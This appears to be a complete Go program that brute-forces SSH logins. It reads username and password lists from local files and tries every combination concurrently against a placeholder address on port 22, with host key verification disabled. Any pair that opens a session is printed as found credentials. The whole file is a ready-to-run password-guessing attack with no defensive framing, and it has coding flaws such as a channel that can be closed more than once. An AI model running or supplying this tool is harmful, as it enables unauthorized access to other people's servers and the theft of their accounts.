package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"os"
	"time"
)

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func ccssh(user, password, ip, port string, c chan string) {
	Pwd := []ssh.AuthMethod{ssh.Password(password)}
	Conf := &ssh.ClientConfig{
		User:    user,
		Auth:    Pwd,
		Timeout: time.Duration(time.Millisecond * 300),
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		}}
	client, err := ssh.Dial("tcp", ip+":"+port, Conf)
	if err != nil {
		c <- "failed to create session"
	}
	if client != nil {
		session, err2 := client.NewSession()
		if err2 != nil {
			c <- "error2"
		}
		if session != nil {
			c <- "username is : " + user + " password is : " + password
			close(c)
			defer session.Close()
		}
		defer client.Close()
	}
}

func main() {
	c := make(chan string)
	unames, err := readLines("./username")
	if err != nil {
		fmt.Println("err")
	}
	pwds, err := readLines("./pwds")
	if err != nil {
		fmt.Println("err")
	}
	for u := 0; u < len(unames); u++ {
		for p := 0; p < len(pwds); p++ {
			go ccssh(unames[u], pwds[p], "x.x.x.x", "22", c)
			time.Sleep(1)
		}

	}
	for v := range c {
		fmt.Println(v)
	}

}
